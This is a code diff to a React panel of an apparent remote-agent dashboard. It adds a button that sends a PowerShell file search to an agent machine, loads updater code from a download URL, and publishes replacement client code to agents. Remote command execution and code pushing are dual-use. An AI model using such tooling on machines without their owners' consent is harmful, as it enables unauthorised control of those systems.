@@ -9,6 +9,7 @@ import { useSocket } from "./SocketProvider";
 import { useTheme } from "./ThemeProvider";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "./ui/card";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "./ui/select";
+import apiClient from "../services/api";
 
 type MonacoEditorProps = {
   height: string;
@@ -17,9 +18,20 @@ type MonacoEditorProps = {
   value: string;
   onChange: (v?: string) => void;
   options?: Record<string, any>;
+  simple?: boolean;
 };
 
-function MonacoEditor({ height, defaultLanguage, theme, value, onChange, options }: MonacoEditorProps) {
+function MonacoEditor({ height, defaultLanguage, theme, value, onChange, options, simple }: MonacoEditorProps) {
+  if (simple) {
+    return (
+      <textarea
+        style={{ height, width: "100%" }}
+        value={value}
+        onChange={(e) => onChange(e.target.value)}
+        className="w-full h-full p-2 border rounded font-mono text-sm bg-background text-foreground"
+      />
+    );
+  }
   const [Editor, setEditor] = useState<any>(null);
   useEffect(() => {
     let mounted = true;
@@ -68,7 +80,7 @@ function MonacoEditor({ height, defaultLanguage, theme, value, onChange, options
 }
 
 export function UpdateClientPanel() {
-  const { agents, selectedAgent, setSelectedAgent, previewFile, uploadFile, socket, sendCommand, connected } = useSocket();
+  const { agents, selectedAgent, setSelectedAgent, previewFile, uploadFile, socket, sendCommand, connected, getLastFilePath } = useSocket();
   const { theme } = useTheme();
   const [agentId, setAgentId] = useState<string | null>(selectedAgent);
   const [filePath, setFilePath] = useState<string>("client.py");
@@ -77,7 +89,8 @@ export function UpdateClientPanel() {
   const [tab, setTab] = useState<string>("editor");
   const [debugRunning, setDebugRunning] = useState<boolean>(false);
   const [debugOutput, setDebugOutput] = useState<string[]>([]);
-  const [bulkUpdating, setBulkUpdating] = useState<boolean>(false);
+  const [latest, setLatest] = useState<{ version?: string; md5?: string; last_push?: string; download_url?: string; size?: number } | null>(null);
+  const [basicEditor, setBasicEditor] = useState<boolean>(false);
   const previewRequestRef = useRef<{ agentId: string; filePath: string } | null>(null);
   
   const selectedAgentName = agents.find(a => a.id === agentId)?.name || "Agent";
@@ -95,6 +108,17 @@ export function UpdateClientPanel() {
         if (online) setAgentId(online.id);
     }
   }, [agents, agentId]);
+
+  useEffect(() => {
+    if (!agentId) return;
+    if (filePath && filePath.trim() && filePath.trim() !== 'client.py') return;
+    try {
+      const last = getLastFilePath(agentId) || '/';
+      const sep = last.includes('\\') || /^[a-zA-Z]:/.test(last) ? '\\' : '/';
+      const next = last.endsWith(sep) ? `${last}client.py` : `${last}${sep}client.py`;
+      setFilePath(next);
+    } catch {}
+  }, [agentId]);
 
   useEffect(() => {
     const handlePreviewReady = async (event: any) => {
@@ -148,6 +172,91 @@ export function UpdateClientPanel() {
     };
   }, [socket, agentId]);
 
+  useEffect(() => {
+    let mounted = true;
+    (async () => {
+      const res = await apiClient.getUpdaterLatest();
+      if (res?.success && res.data) {
+        if (!mounted) return;
+        const d: any = res.data;
+        setLatest({ version: d.version, md5: d.md5, last_push: d.last_push, download_url: d.download_url, size: d.size });
+      }
+    })();
+    return () => { mounted = false; };
+  }, []);
+
+  useEffect(() => {
+    try {
+      const cached = localStorage.getItem('updater_code') || '';
+      const cachedMd5 = localStorage.getItem('updater_md5') || '';
+      if (cached && !code) {
+        setCode(cached);
+      }
+      if (cached && latest?.md5 && cachedMd5 === latest.md5 && !code) {
+        setCode(cached);
+      }
+    } catch {}
+  }, [latest]);
+
+  useEffect(() => {
+    (async () => {
+      if (!latest) return;
+      if (code && code.trim().length > 0) return;
+      const url = latest.download_url || '';
+      if (!url) return;
+      try {
+        const r = await fetch(url);
+        const t = await r.text();
+        if (t && t.trim()) {
+          setCode(t);
+          try {
+            localStorage.setItem('updater_code', t);
+            if (latest.md5) localStorage.setItem('updater_md5', latest.md5);
+          } catch {}
+        }
+      } catch {}
+    })();
+  }, [latest, code]);
+
+  useEffect(() => {
+    const onChunk = (event: any) => {
+      const data = event?.detail;
+      if (!data) return;
+      const req = previewRequestRef.current;
+      if (!req) return;
+      const id = String(data?.download_id || "");
+      if (!id.startsWith("preview_")) return;
+      const aid = String(data?.agent_id || "");
+      if (req.agentId && aid && aid !== req.agentId) return;
+      if (typeof data?.error === "string" && data.error) {
+        setLoading(false);
+        toast.error(data.error);
+      }
+    };
+    window.addEventListener("file_download_chunk", onChunk);
+    return () => {
+      window.removeEventListener("file_download_chunk", onChunk);
+    };
+  }, []);
+
+  useEffect(() => {
+    const onOpen = (e: any) => {
+      const d = e?.detail || {};
+      const aid = typeof d?.agentId === 'string' ? d.agentId : agentId;
+      const path = typeof d?.path === 'string' ? d.path : filePath;
+      if (aid) {
+        setAgentId(aid);
+        setSelectedAgent(aid);
+      }
+      if (path) setFilePath(path);
+      setTimeout(() => handleLoadCode(), 50);
+    };
+    window.addEventListener('open_in_updater', onOpen);
+    return () => {
+      window.removeEventListener('open_in_updater', onOpen);
+    };
+  }, [agentId, filePath]);
+
   const normalizeDestinationDir = (destinationPath: string, filename: string): string => {
     const raw = (destinationPath || "").trim();
     if (!raw) return "";
@@ -175,11 +284,51 @@ export function UpdateClientPanel() {
     const fname = sanitizeFilename(filePath);
     previewFile?.(agentId, fname);
     setTimeout(() => setLoading(false), 800);
-    setTimeout(() => {
+    setTimeout(async () => {
       if (!code.trim()) {
+        try {
+          const url = latest?.download_url || "";
+          if (url) {
+            const r = await fetch(url);
+            const t = await r.text();
+            if (t && t.trim()) {
+              setCode(t);
+              toast.info("Loaded controller copy of client.py");
+              return;
+            }
+          }
+        } catch {}
         toast.error("Preview not received. Try full path like C:/Users/YourName/Desktop/client.py");
       }
-    }, 2500);
+    }, 2000);
+  };
+
+  const handleFind = async () => {
+    if (!agentId || !connected) {
+      toast.error("No agent connected");
+      return;
+    }
+    setTab("debugger");
+    setDebugRunning(true);
+    setDebugOutput([]);
+    const cmd = `powershell -NoProfile -Command "(Get-ChildItem -Path C:\\ -Filter client.py -File -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName)"`;
+    sendCommand(agentId, cmd);
+    const startedAt = Date.now();
+    const timer = setInterval(() => {
+      const out = debugOutput.join("\\n");
+      const m = out.match(/([A-Za-z]:\\\\[^\\n]*client\\.py)/i);
+      if (m && m[1]) {
+        clearInterval(timer);
+        setDebugRunning(false);
+        setFilePath(m[1]);
+        setTab("editor");
+        setTimeout(() => handleLoadCode(), 200);
+      } else if (Date.now() - startedAt > 8000) {
+        clearInterval(timer);
+        setDebugRunning(false);
+        toast.error("Auto locate failed");
+      }
+    }, 500);
   };
 
   const handleDebug = async () => {
@@ -213,22 +362,24 @@ export function UpdateClientPanel() {
     toast.success(`Pushed update to agent`);
   };
 
-  const handleUpdateAll = async () => {
-    if (!connected) {
-      toast.error("Not connected");
+  const handlePublishUpdater = async () => {
+    if (!code.trim()) {
+      toast.error("No code to publish");
       return;
     }
-    setBulkUpdating(true);
-    try {
-      socket?.emit('broadcast_client_update', { code });
-      toast.success(`Broadcasted client update to all connected agents`);
-    } finally {
-      setBulkUpdating(false);
+    const res = await apiClient.pushUpdater(code);
+    if (res?.success && res.data) {
+      const d: any = res.data;
+      setLatest({ version: d.version, md5: d.md5, last_push: d.last_push });
+      toast.success("Updater state updated");
+    } else {
+      toast.error(res?.error || "Failed to publish updater");
     }
   };
+  // Removed "Update Agent" and "Push All" actions per request
 
   return (
-    <div className="h-[calc(100vh-6rem)] flex flex-col border rounded-md overflow-hidden bg-background shadow-sm">
+    <div className="h-[calc(100vh-3rem)] flex flex-col border rounded-md overflow-hidden bg-background shadow-sm">
       {/* Toolbar */}
       <div className="flex items-center justify-between px-4 py-2 border-b bg-muted/20 shrink-0">
         <div className="flex items-center gap-4">
@@ -261,6 +412,9 @@ export function UpdateClientPanel() {
                <Button size="sm" variant="ghost" className="h-8 px-2 text-xs" onClick={handleLoadCode} disabled={!agentId || loading}>
                  Load
                </Button>
+               <Button size="sm" variant="ghost" className="h-8 px-2 text-xs" onClick={handleFind} disabled={!agentId || loading}>
+                 Find
+               </Button>
            </div>
            
            <Badge variant={connected ? "default" : "secondary"} className="text-[10px] h-5">{connected ? "Connected" : "Offline"}</Badge>
@@ -273,8 +427,8 @@ export function UpdateClientPanel() {
            <Button size="sm" className="h-8 text-xs" onClick={handleUpdateSelected} disabled={loading || !agentId || !code.trim()}>
               Push to {selectedAgentName}
            </Button>
-           <Button size="sm" variant="destructive" className="h-8 text-xs" onClick={handleUpdateAll} disabled={bulkUpdating || !code.trim()}>
-              Push All
+           <Button size="sm" variant="secondary" className="h-8 text-xs" onClick={handlePublishUpdater} disabled={!code.trim()}>
+              Publish Updater
            </Button>
         </div>
       </div>
@@ -290,13 +444,14 @@ export function UpdateClientPanel() {
              </div>
              
              <TabsContent value="editor" className="flex-1 flex flex-col min-h-0 m-0 p-0 data-[state=active]:flex relative">
-                <div className="flex-1 relative">
+                <div className="flex-1 relative max-h-[85vh]">
                    <MonacoEditor
                      height="100%"
                      defaultLanguage="python"
                      theme={monacoTheme}
                      value={code}
                      onChange={(v?: string) => setCode(v || "")}
+                     simple={basicEditor}
                      options={{
                        fontSize: 14,
                        minimap: { enabled: true },
@@ -306,6 +461,19 @@ export function UpdateClientPanel() {
                        padding: { top: 16 }
                      }}
                    />
+                </div>
+                <div className="border-t px-4 py-2 text-xs flex items-center gap-4">
+                  <span className="opacity-70">Last Push:</span>
+                  <span className="font-mono">{latest?.last_push || "—"}</span>
+                  <span className="opacity-70">Version:</span>
+                  <span className="font-mono">{latest?.version || "—"}</span>
+                  <span className="opacity-70">MD5:</span>
+                  <span className="font-mono">{latest?.md5 || "—"}</span>
+                  <span className="ml-auto flex items-center gap-2">
+                    <Button size="sm" variant="outline" className="h-7 px-2 text-[11px]" onClick={() => setBasicEditor((v) => !v)}>
+                      {basicEditor ? "Use Advanced Editor" : "Use Basic Editor"}
+                    </Button>
+                  </span>
                 </div>
              </TabsContent>
              
